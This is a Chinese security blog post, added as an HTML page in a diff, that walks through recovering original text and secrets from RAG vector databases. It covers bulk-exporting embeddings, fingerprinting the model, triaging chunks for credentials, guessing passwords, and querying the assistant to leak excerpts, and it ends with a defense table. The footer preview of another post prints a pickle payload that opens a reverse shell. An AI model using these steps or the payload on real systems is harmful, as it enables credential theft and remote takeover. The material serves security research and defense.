@@ -1,0 +1,345 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>嵌入向量攻击：从向量数据库反推原文 | Cr4at0r's Blog</title><meta name="author" content="Cr4at0r"><meta name="copyright" content="Cr4at0r"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="很多团队对向量库的安全预期是「存的是数学，不是内容」。这个预期不成立。嵌入向量是文本经过一个确定函数的产物：同一句话永远映射到同一个点，语义相近的文本落在相邻位置。向量不加密，不摘要，它是原文的一个有损投影，而投影是可逆的。 这篇文章按攻击顺序写：怎么把向量拿出来、怎么认出是哪个模型生成的、怎么从几万个切片里挑出值得还原的、以及两种把原文还原出来的方法。最后给一个不需要导出权限的变体。 第一步：向">
+<meta property="og:type" content="article">
+<meta property="og:title" content="嵌入向量攻击：从向量数据库反推原文">
+<meta property="og:url" content="https://cr4at0r.github.io/2026/10/03/%E5%B5%8C%E5%85%A5%E5%90%91%E9%87%8F%E6%94%BB%E5%87%BB-%E4%BB%8E%E5%90%91%E9%87%8F%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8F%8D%E6%8E%A8%E5%8E%9F%E6%96%87/index.html">
+<meta property="og:site_name" content="Cr4at0r&#39;s Blog">
+<meta property="og:description" content="很多团队对向量库的安全预期是「存的是数学，不是内容」。这个预期不成立。嵌入向量是文本经过一个确定函数的产物：同一句话永远映射到同一个点，语义相近的文本落在相邻位置。向量不加密，不摘要，它是原文的一个有损投影，而投影是可逆的。 这篇文章按攻击顺序写：怎么把向量拿出来、怎么认出是哪个模型生成的、怎么从几万个切片里挑出值得还原的、以及两种把原文还原出来的方法。最后给一个不需要导出权限的变体。 第一步：向">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cr4at0r.github.io/img/avatar-oss-2.jpeg">
+<meta property="article:published_time" content="2026-10-02T16:00:00.000Z">
+<meta property="article:modified_time" content="2026-10-07T16:17:18.647Z">
+<meta property="article:author" content="Cr4at0r">
+<meta property="article:tag" content="AI安全">
+<meta property="article:tag" content="RAG">
+<meta property="article:tag" content="嵌入向量">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cr4at0r.github.io/img/avatar-oss-2.jpeg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "嵌入向量攻击：从向量数据库反推原文",
+  "url": "https://cr4at0r.github.io/2026/10/03/%E5%B5%8C%E5%85%A5%E5%90%91%E9%87%8F%E6%94%BB%E5%87%BB-%E4%BB%8E%E5%90%91%E9%87%8F%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8F%8D%E6%8E%A8%E5%8E%9F%E6%96%87/",
+  "image": "https://cr4at0r.github.io/img/avatar-oss-2.jpeg",
+  "datePublished": "2026-10-02T16:00:00.000Z",
+  "dateModified": "2026-10-07T16:17:18.647Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Cr4at0r",
+      "url": "https://cr4at0r.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/avatar.png"><link rel="canonical" href="https://cr4at0r.github.io/2026/10/03/%E5%B5%8C%E5%85%A5%E5%90%91%E9%87%8F%E6%94%BB%E5%87%BB-%E4%BB%8E%E5%90%91%E9%87%8F%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8F%8D%E6%8E%A8%E5%8E%9F%E6%96%87/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.7.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.3.1/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        const data = { value }
+
+        if (ttl != null) {
+          data.expiry = Date.now() + ttl * 86400000
+        }
+
+        localStorage.setItem(key, JSON.stringify(data))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return
+
+        try {
+          const data = JSON.parse(itemStr)
+
+          if (data.expiry && Date.now() > data.expiry) {
+            localStorage.removeItem(key)
+            return
+          }
+
+          return data.value
+        } catch {
+          localStorage.removeItem(key)
+        }
+      }
+    }
+
+    const scriptCache = new Map()
+    const cssCache = new Map()
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => {
+        if (scriptCache.has(url)) {
+          return scriptCache.get(url)
+        }
+
+        const promise = new Promise((resolve, reject) => {
+          const script = document.createElement('script')
+
+          script.src = url
+          script.async = true
+
+          for (const key in attr) {
+            script.setAttribute(key, attr[key])
+          }
+
+          script.onload = resolve
+          script.onerror = reject
+
+          document.head.appendChild(script)
+        })
+
+        scriptCache.set(url, promise)
+
+        return promise
+      },
+      getCSS: (url, id) => {
+        if (cssCache.has(url)) {
+          return cssCache.get(url)
+        }
+
+        const promise = new Promise((resolve, reject) => {
+          const link = document.createElement('link')
+
+          link.rel = 'stylesheet'
+          link.href = url
+
+          if (id) {
+            link.id = id
+          }
+
+          link.onload = resolve
+          link.onerror = reject
+
+          document.head.appendChild(link)
+        })
+
+        cssCache.set(url, promise)
+
+        return promise
+      },
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const metaThemeColor = document.querySelector('meta[name="theme-color"]')
+      const activateDarkMode = () => {
+        document.documentElement.dataset.theme = 'dark'
+        if (metaThemeColor !== null) {
+          metaThemeColor.setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.dataset.theme = 'light'
+        if (metaThemeColor !== null) {
+          metaThemeColor.setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '嵌入向量攻击：从向量数据库反推原文',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 8.1.2"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">14</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">19</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/categories/AI%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/"><span> AI安全研究</span></a></div><div class="menus_item"><a class="site-page" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"><span> 漏洞复现</span></a></div><div class="menus_item"><a class="site-page" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><span> 代码审计</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/avatar-oss-2.jpeg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Cr4at0r's Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">嵌入向量攻击：从向量数据库反推原文</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/categories/AI%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/"><span> AI安全研究</span></a></div><div class="menus_item"><a class="site-page" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"><span> 漏洞复现</span></a></div><div class="menus_item"><a class="site-page" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><span> 代码审计</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">嵌入向量攻击：从向量数据库反推原文</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-10-02T16:00:00.000Z" title="发表于 2026-10-03 00:00:00">2026-10-03</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-10-07T16:17:18.647Z" title="更新于 2026-10-08 00:17:18">2026-10-08</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/AI%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/">AI安全研究</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p>很多团队对向量库的安全预期是「存的是数学，不是内容」。这个预期不成立。嵌入向量是文本经过一个确定函数的产物：同一句话永远映射到同一个点，语义相近的文本落在相邻位置。<strong>向量不加密，不摘要，它是原文的一个有损投影，而投影是可逆的。</strong></p>
+<p>这篇文章按攻击顺序写：怎么把向量拿出来、怎么认出是哪个模型生成的、怎么从几万个切片里挑出值得还原的、以及两种把原文还原出来的方法。最后给一个不需要导出权限的变体。</p>
+<h2 id="第一步：向量库常常是能直接读的"><a href="#第一步：向量库常常是能直接读的" class="headerlink" title="第一步：向量库常常是能直接读的"></a>第一步：向量库常常是能直接读的</h2><p>向量库的默认姿态偏开发：端口开着、API 自描述、鉴权可选。内网评估里命中率高的是这几个：</p>
+<table>
+<thead>
+<tr>
+<th>产品</th>
+<th>默认端口</th>
+<th>匿名读取</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Chroma</td>
+<td>8000</td>
+<td>常见</td>
+</tr>
+<tr>
+<td>Qdrant</td>
+<td>6333（HTTP）</td>
+<td>取决于配置</td>
+</tr>
+<tr>
+<td>Milvus</td>
+<td>19530（gRPC）&#x2F; 9091</td>
+<td>取决于配置</td>
+</tr>
+<tr>
+<td>Weaviate</td>
+<td>8080</td>
+<td>取决于配置</td>
+</tr>
+</tbody></table>
+<p>以 Chroma 为例，确认存在的两个请求：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/api/v1/collections</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>10.0.4.11:8000</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"></span><br><span class="line"><span class="language-css"><span class="selector-attr">[&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;it_help&quot;</span>,<span class="string">&quot;id&quot;</span>:<span class="string">&quot;c1a9-...&quot;</span>,<span class="string">&quot;metadata&quot;</span>:&#123;<span class="string">&quot;hnsw:space&quot;</span>:<span class="string">&quot;cosine&quot;</span>&#125;&#125;]</span></span></span><br></pre></td></tr></table></figure>
+
+<p>拿到 collection id 后分页拉全量，<code>include</code> 里带上 embedding：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/v1/collections/c1a9-.../get</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>10.0.4.11:8000</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"></span><br><span class="line"><span class="language-prolog">&#123;<span class="string">&quot;limit&quot;</span>:<span class="number">200</span>,<span class="string">&quot;offset&quot;</span>:<span class="number">0</span>,<span class="string">&quot;include&quot;</span>:[<span class="string">&quot;metadatas&quot;</span>,<span class="string">&quot;documents&quot;</span>,<span class="string">&quot;embeddings&quot;</span>]&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>如果部署方连 <code>documents</code> 都返回，攻击直接结束——原文就在响应里。多数生产配置会关掉 documents 字段或根本没存原文，只留 embedding 和 metadata。<strong>这正是嵌入攻击要处理的情况：只有向量，没有原文。</strong></p>
+<p>Qdrant 的等价操作是 <code>POST /collections/{name}/points/scroll</code>，<code>with_vector: true</code>。写个循环翻页，一小时能把几十万条向量拉完。这一步的检测信号很明显：单客户端顺序翻全库的分页读取，和正常检索的「查询-返回 top-k」模式完全不同。</p>
+<h2 id="第二步：认出生成这些向量的模型"><a href="#第二步：认出生成这些向量的模型" class="headerlink" title="第二步：认出生成这些向量的模型"></a>第二步：认出生成这些向量的模型</h2><p>还原方法依赖模型。不知道模型，就不知道该用什么函数去逼近逆映射。识别分两步，先窄化再确认。</p>
+<p><strong>维度指纹。</strong> 第一刀按维度切：</p>
+<table>
+<thead>
+<tr>
+<th>维度</th>
+<th>常见模型</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>384</td>
+<td>all-MiniLM-L6-v2</td>
+</tr>
+<tr>
+<td>768</td>
+<td>BGE-base、text-embedding-004</td>
+</tr>
+<tr>
+<td>1024</td>
+<td>Cohere embed-english-v3</td>
+</tr>
+<tr>
+<td>1536</td>
+<td>OpenAI text-embedding-ada-002 &#x2F; 3-small</td>
+</tr>
+<tr>
+<td>3072</td>
+<td>OpenAI text-embedding-3-large</td>
+</tr>
+</tbody></table>
+<p>取一条向量看长度：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/v1/collections/c1a9-.../get</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"></span><br><span class="line"><span class="language-prolog">&#123;<span class="string">&quot;limit&quot;</span>:<span class="number">1</span>,<span class="string">&quot;include&quot;</span>:[<span class="string">&quot;embeddings&quot;</span>]&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>768 维把候选砍到一小排。仓库、招聘启事、<code>rag.yaml</code>（004 里提过）里的嵌入模型名可以直接把候选收敛到一个或两个。</p>
+<p><strong>推理探测。</strong> 剩下的候选用行为确认。原理：RAG 每次都会把用户问题嵌入后去库里搜。找一个已经知道大概内容的文档主题，向助手提问，让它把检索到的片段吐回来（<code>sources.excerpt</code> 004 写过怎么做）；在本地把同一段文本用候选模型各自嵌入，和库里对应切片的向量算余弦相似度。正确模型的相似度通常在 0.95 以上，错误模型在 0.5 到 0.7。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> sentence_transformers <span class="keyword">import</span> SentenceTransformer</span><br><span class="line"></span><br><span class="line">candidates = [<span class="string">&quot;BAAI/bge-base-en-v1.5&quot;</span>, <span class="string">&quot;sentence-transformers/all-mpnet-base-v2&quot;</span>]</span><br><span class="line">stored = np.load(<span class="string">&quot;chunk_881.npy&quot;</span>)            <span class="comment"># 从导出数据里取</span></span><br><span class="line">recovered = <span class="string">&quot;VPN 登录后无法访问内网。标准处理：先完成设备校验，再重连。&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> candidates:</span><br><span class="line">    model = SentenceTransformer(name)</span><br><span class="line">    vec = model.encode(recovered, normalize_embeddings=<span class="literal">True</span>)</span><br><span class="line">    <span class="built_in">print</span>(name, <span class="built_in">float</span>(np.dot(vec, stored[<span class="number">0</span>])))</span><br></pre></td></tr></table></figure>
+
+<p>两个模型对同一段文本的分数差距一般在 0.2 以上，边界清楚。</p>
+<h2 id="第三步：分诊——先挑出值得还原的"><a href="#第三步：分诊——先挑出值得还原的" class="headerlink" title="第三步：分诊——先挑出值得还原的"></a>第三步：分诊——先挑出值得还原的</h2><p>全库几万条切片，逐条还原不现实，也没必要：大多数是产品手册和会议纪要。分诊的目标是在不动原文的情况下，找出哪些切片大概率含有凭据、密钥、内网地址。</p>
+<p>原理：<strong>语义相近的文本向量也相近。</strong> 准备一组探针文本，覆盖敏感类别——「数据库密码配置」「AWS access key 示例」「生产环境连接串」「API 鉴权 token」，每类若干条变体。本地嵌入探针，和库里每个切片算余弦，取每片对探针的最高分作为敏感分：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">probes = model.encode([</span><br><span class="line">    <span class="string">&quot;the database password is configured in&quot;</span>,</span><br><span class="line">    <span class="string">&quot;AWS_ACCESS_KEY_ID = AKIA&quot;</span>,</span><br><span class="line">    <span class="string">&quot;jdbc:postgresql://prod internal password&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Bearer token for internal API&quot;</span>,</span><br><span class="line">], normalize_embeddings=<span class="literal">True</span>)</span><br><span class="line">scores = vectors @ probes.T          <span class="comment"># N x 4</span></span><br><span class="line">sensitive = scores.<span class="built_in">max</span>(axis=<span class="number">1</span>)</span><br><span class="line">top = np.argsort(sensitive)[-<span class="number">50</span>:]</span><br></pre></td></tr></table></figure>
+
+<p>再叠一层结构信号：真实凭据文档在库里的近邻通常很少（它周围不是成片的同类内容），而正常文档的近邻是一簇主题相近的切片。用 k-NN 密度做第二列分数，两列融合排序，前 50 到 100 条进入还原阶段。</p>
+<p>这一步的价值经常被高估的还原步骤本身掩盖：<strong>很多时候不需要还原全文，只需要知道「第 881 号切片像是配置文档」</strong>——结合它所属的 collection 名和 metadata 里的来源路径，攻击方向已经足够明确。</p>
+<p><img src="/img/embedding-reversal-pipeline.png" alt="嵌入还原流水线"></p>
+<h2 id="第四步：还原原文的两种方法"><a href="#第四步：还原原文的两种方法" class="headerlink" title="第四步：还原原文的两种方法"></a>第四步：还原原文的两种方法</h2><h3 id="方法一：模板-成员推断"><a href="#方法一：模板-成员推断" class="headerlink" title="方法一：模板 + 成员推断"></a>方法一：模板 + 成员推断</h3><p>嵌入空间对<strong>高熵随机串</strong>无能为力——<code>Spring2026!x9</code> 和 <code>G0vPass123!</code> 在语义上都是「一个密码」，向量几乎相同。但它对<strong>结构</strong>非常敏感：这句话是配置说明、字段名是什么、值长什么样，都反映在向量里。</p>
+<p>所以把还原拆成两个子问题：</p>
+<ol>
+<li><strong>结构还原</strong>：恢复句子骨架，把秘密位置替换成占位符。零样本做法是把候选模板库逐条嵌入，和目标向量比相似度。模板库覆盖常见运维文档句式：</li>
+</ol>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;&#123;service&#125; 数据库连接串：postgres://&#123;user&#125;:&#123;password&#125;@&#123;host&#125;:&#123;port&#125;/&#123;db&#125;&quot;</span><br><span class="line">&quot;&#123;env&#125; 环境的 &#123;system&#125; 使用 &#123;auth&#125; 认证，地址 &#123;url&#125;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>   取相似度最高的模板作为骨架。</p>
+<ol start="2">
+<li><strong>槽位填充（成员推断）</strong>：对每个占位符，枚举候选值——密码用季节+年份+常见后缀、主机名用 <code>db01/db02/pg-rw-01</code>、端口用 5432&#x2F;6379。每个候选嵌入后放进模板算向量，与目标向量的距离作为似然。<strong>候选词表越小，命中率越高</strong>，这也是为什么企业内的密码策略（强制 <code>季度+年份</code>）会显著提高这类攻击的还原率。</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> cand <span class="keyword">in</span> [<span class="string">&quot;Spring2026!&quot;</span>, <span class="string">&quot;Q1-2026!&quot;</span>, <span class="string">&quot;Corp2026!&quot;</span>, <span class="string">&quot;Summer2025!&quot;</span>]:</span><br><span class="line">    text = template.replace(<span class="string">&quot;&#123;password&#125;&quot;</span>, cand)</span><br><span class="line">    score = cosine(model.encode(text), target_vec)</span><br></pre></td></tr></table></figure>
+
+<p>分数差 0.01 以上就值得信。整个流程对 GPU 要求极低，笔记本能跑。</p>
+<h3 id="方法二：迭代重建"><a href="#方法二：迭代重建" class="headerlink" title="方法二：迭代重建"></a>方法二：迭代重建</h3><p>成员推断填的是可枚举的槽位。对自由文本，用「生成-嵌入-对齐」循环：</p>
+<ol>
+<li>用一个本地 LLM 生成候选句子（以已还原的片段为上文续写）。</li>
+<li>嵌入候选句，与目标向量算距离。</li>
+<li>保留使距离下降的候选，拼回上下文，继续生成下一段。</li>
+</ol>
+<p>这是学术上 vec2text 一类方法的工程化描述。公开研究里，1536 维的 ada-002 在 32 token 的短切片上可以恢复出可用性很高的文本；切片越短，还原越完整。<strong>这给出一个防御相关的结论：切片越长越难还原，但检索质量越差——安全性和产品效果在这条参数上直接冲突，需要显式取舍，而不是默认值一设了之。</strong></p>
+<p>还有一个不碰向量库的变体：把 RAG 本身当 oracle。不用导出，用大量改写的问题去查询，让 <code>sources.excerpt</code> 把切片原文一段段带回来（004 的方法）。两者结合——查询拿片段、嵌入对齐拼全文——在只读权限下也能逼近完整文档。</p>
+<h2 id="攻击条件与防御"><a href="#攻击条件与防御" class="headerlink" title="攻击条件与防御"></a>攻击条件与防御</h2><table>
+<thead>
+<tr>
+<th>环节</th>
+<th>攻击需要</th>
+<th>防御卡点</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>导出</td>
+<td>向量库端口可达 + 读权限</td>
+<td>端口不对用户网段开放；读写分离；翻全库告警</td>
+</tr>
+<tr>
+<td>指纹</td>
+<td>知道模型名或能提问</td>
+<td>助手侧限制 excerpt 返回；不外显模型信息</td>
+</tr>
+<tr>
+<td>分诊</td>
+<td>本地嵌入模型</td>
+<td>（无法阻止，靠前三层拦住）</td>
+</tr>
+<tr>
+<td>还原</td>
+<td>高熵不足 + 切片短</td>
+<td>秘密不进知识库；切片长度权衡；切片访问审计</td>
+</tr>
+</tbody></table>
+<p>四条里最有效的其实是写在文档里的：<strong>密码、密钥、连接串根本不该进知识库。</strong> 嵌入攻击的全部收益来自「以为数学化了就等于脱敏了」。运维文档照常进库、权限照常给全员，向量导出只是把这条流程问题换了个利用形式。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://cr4at0r.github.io">Cr4at0r</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://cr4at0r.github.io/2026/10/03/%E5%B5%8C%E5%85%A5%E5%90%91%E9%87%8F%E6%94%BB%E5%87%BB-%E4%BB%8E%E5%90%91%E9%87%8F%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8F%8D%E6%8E%A8%E5%8E%9F%E6%96%87/">https://cr4at0r.github.io/2026/10/03/%E5%B5%8C%E5%85%A5%E5%90%91%E9%87%8F%E6%94%BB%E5%87%BB-%E4%BB%8E%E5%90%91%E9%87%8F%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8F%8D%E6%8E%A8%E5%8E%9F%E6%96%87/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://cr4at0r.github.io" target="_blank">Cr4at0r's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/AI%E5%AE%89%E5%85%A8/">AI安全</a><a class="post-meta__tags" href="/tags/RAG/">RAG</a><a class="post-meta__tags" href="/tags/%E5%B5%8C%E5%85%A5%E5%90%91%E9%87%8F/">嵌入向量</a></div><div class="post-share"><div class="social-share" data-image="/img/avatar-oss-2.jpeg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2026/10/04/AI%E4%BE%9B%E5%BA%94%E9%93%BE%E6%94%BB%E5%87%BB-%E4%BB%8E%E6%A8%A1%E5%9E%8B%E6%96%87%E4%BB%B6%E5%88%B0%E4%BE%9D%E8%B5%96%E5%8C%85%E7%9A%84%E4%BF%A1%E4%BB%BB%E5%8D%B1%E6%9C%BA/" title="AI供应链攻击：从模型文件到依赖包的信任危机"><img class="cover" src="/img/avatar-oss.jpeg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">AI供应链攻击：从模型文件到依赖包的信任危机</div></div><div class="info-2"><div class="info-item-1">传统供应链攻击的落点是「代码」。AI 栈把它扩成了一个更模糊的问题：哪些文件会被「执行」。 .py 当然会；.pt 模型文件会；adapter.safetensors 不会执行代码，但会改变模型输出；tokenizer.json 只是两张映射表，改动两个整数就能让分类器失效。 这篇按「被执行的程度」从高到低写：pickle 反序列化、扫描器绕过、LoRA 投毒、tokenizer 操纵、依赖混淆。每一段给出可复现的最小代码和对应防御。 一、.pt 文件是代码，不是权重PyTorch 默认格式 .pt 底层是 Python pickle。pickle 的设计目标之一就是序列化「任意对象」，加载时执行构造指令。构造 RCE 不需要漏洞： 1234567import torch, osclass RevShell:    def __reduce__(self):        return (os.system, (&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.2.9.7/4444 0&gt;&amp;1&#x27;&quot;,...</div></div></div></a><a class="pagination-related" href="/2026/09/30/RAG%E6%94%BB%E5%87%BB%E9%9D%A2-%E4%BD%A0%E7%9A%84%E7%9F%A5%E8%AF%86%E5%BA%93%E6%98%AF%E5%AE%89%E5%85%A8%E7%9A%84%E5%90%97/" title="RAG攻击面：你的知识库是安全的吗"><img class="cover" src="/img/avatar-oss.jpeg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info 